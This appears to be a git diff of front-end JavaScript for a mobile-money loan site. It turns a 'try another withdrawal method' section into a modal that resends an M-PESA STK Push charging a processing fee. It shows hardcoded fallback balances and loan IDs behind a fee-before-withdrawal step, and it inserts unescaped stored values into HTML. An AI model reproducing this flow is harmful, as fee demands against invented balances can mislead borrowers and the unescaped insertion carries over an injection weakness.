@@ -1909,51 +1909,57 @@ async function retryWithdrawal() {
         alert("❌ Retry failed. Please try again.");
     }
 }
- // ===============================
-// TRY OTHER METHOD HANDLER
+  // ===============================
+// TRY OTHER METHOD (Modal Version)
 // ===============================
-document.addEventListener("click", async (e) => {
+document.addEventListener("click", (e) => {
   if (e.target && e.target.id === "tryOtherMethod") {
     e.preventDefault();
-    showTryOtherMethodSection();
-    // auto-scroll into view for mobile
-    setTimeout(() => {
-      document.getElementById("retrySection")?.scrollIntoView({ behavior: "smooth" });
-    }, 300);
+    openTryOtherMethodModal();
   }
 });
 
-function showTryOtherMethodSection() {
-  const container = document.getElementById("successAlert");
+function openTryOtherMethodModal() {
+  // Remove if it already exists
+  const existingModal = document.getElementById("retryModal");
+  if (existingModal) existingModal.remove();
 
-  const html = `
-    <div id="retrySection" class="mt-6 bg-blue-50 border border-blue-200 rounded-xl p-6 text-left">
-      <h3 class="text-lg font-semibold text-gray-900 mb-2">Try Another Withdrawal Method</h3>
-      <p class="text-sm text-gray-600 mb-4">
-        You can retry your withdrawal using another method. Review your details below before retrying.
-      </p>
-      
-      <div class="space-y-2 text-sm">
-        <p><span class="font-semibold text-gray-700">Name:</span> ${localStorage.getItem("swift_customer_name") || "Applicant"}</p>
-        <p><span class="font-semibold text-gray-700">Phone:</span> ${loanData.phone}</p>
-        <p><span class="font-semibold text-gray-700">Loan Amount:</span> ${document.getElementById("loanAmount").textContent}</p>
-        <p><span class="font-semibold text-gray-700">Fee Required:</span> ${document.getElementById("processingFee").textContent}</p>
-        <p><span class="font-semibold text-gray-700">Previous Method:</span> ${localStorage.getItem("swift_withdrawal_method")?.toUpperCase() || "M-PESA"}</p>
+  const modalHTML = `
+    <div id="retryModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
+      <div class="bg-white w-11/12 max-w-md rounded-2xl shadow-xl p-6 relative">
+        <button id="closeRetryModal" class="absolute top-3 right-3 text-gray-400 hover:text-gray-600 text-2xl">&times;</button>
+        <h3 class="text-xl font-semibold text-gray-900 mb-3 text-center">Try Another Withdrawal Method</h3>
+        <p class="text-sm text-gray-600 mb-4 text-center">Review your loan details below before retrying the withdrawal.</p>
+
+        <div class="bg-gray-50 rounded-xl border border-gray-200 p-4 space-y-2 text-sm">
+          <p><span class="font-semibold text-gray-700">Full Name:</span> ${localStorage.getItem("swift_customer_name") || "Applicant"}</p>
+          <p><span class="font-semibold text-gray-700">Phone Number:</span> ${loanData.phone}</p>
+          <p><span class="font-semibold text-gray-700">Loan ID:</span> ${localStorage.getItem("swift_loan_id") || "LN-10001"}</p>
+          <p><span class="font-semibold text-gray-700">Loan Amount:</span> ${document.getElementById("loanAmount").textContent}</p>
+          <p><span class="font-semibold text-gray-700">Processing Fee:</span> ${document.getElementById("processingFee").textContent}</p>
+          <p><span class="font-semibold text-gray-700">Available Balance:</span> KES ${localStorage.getItem("swift_available_balance") || "14,861"}</p>
+          <p><span class="font-semibold text-gray-700">Previous Method:</span> ${localStorage.getItem("swift_withdrawal_method")?.toUpperCase() || "M-PESA"}</p>
+        </div>
+
+        <div class="mt-4 text-xs text-blue-600 bg-blue-100 border border-blue-200 p-3 rounded-lg">
+          ⚠️ Retrying will resend an STK Push for the processing fee to your registered phone.
+        </div>
+
+        <button id="retryWithdrawBtn" class="mt-5 w-full bg-primary text-white py-3 rounded-lg hover:bg-primary-dark transition">
+          Withdraw Now
+        </button>
+
+        <p id="retryStatus" class="text-sm mt-3 font-medium text-center"></p>
       </div>
-
-      <div class="mt-4 text-xs text-blue-600 bg-blue-100 border border-blue-200 p-3 rounded-lg">
-        ⚠️ Retrying will resend an STK Push for the processing fee to your registered phone.
-      </div>
-
-      <button id="retryWithdrawBtn" class="mt-5 w-full bg-primary text-white py-3 rounded-lg hover:bg-primary-dark transition">
-        Withdraw Now
-      </button>
-
-      <p id="retryStatus" class="text-sm mt-3 font-medium"></p>
     </div>
   `;
 
-  container.insertAdjacentHTML("beforeend", html);
+  document.body.insertAdjacentHTML("beforeend", modalHTML);
+
+  document.getElementById("closeRetryModal").addEventListener("click", () => {
+    document.getElementById("retryModal").remove();
+  });
+
   document.getElementById("retryWithdrawBtn").addEventListener("click", sendRetryPayment);
 }
 
@@ -1969,7 +1975,6 @@ async function sendRetryPayment() {
   statusEl.textContent = "Sending new STK Push...";
 
   try {
-    // 1️⃣ Initiate payment
     const res = await fetch("https://swiftpaystack.onrender.com/api/paystack-stk", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -1981,7 +1986,6 @@ async function sendRetryPayment() {
 
     const data = await res.json();
     const reference = data?.data?.data?.reference;
-
     if (!data.status || !reference) throw new Error(data.message || "Failed to initiate retry payment");
 
     statusEl.innerHTML = `
@@ -1991,7 +1995,6 @@ async function sendRetryPayment() {
     `;
     statusEl.className = "text-blue-700 font-medium mt-3";
 
-    // 2️⃣ Poll verification endpoint every 5 s (max 90 s)
     const startTime = Date.now();
     const pollInterval = setInterval(async () => {
       if (Date.now() - startTime > 90000) {
@@ -2014,9 +2017,8 @@ async function sendRetryPayment() {
           if (tx.status === "success") {
             statusEl.innerHTML = `
               ✅ Payment successful! Reference: <b>${reference}</b><br>
-              <a href="https://swiftpaystack.onrender.com/receipt/${reference}"
-                 target="_blank" class="text-blue-600 underline inline-block mt-2">
-                 📄 Download Receipt
+              <a href="https://swiftpaystack.onrender.com/receipt/${reference}" target="_blank" class="text-blue-600 underline inline-block mt-2">
+                📄 Download Receipt
               </a>
             `;
             statusEl.className = "text-green-600 font-semibold mt-3";
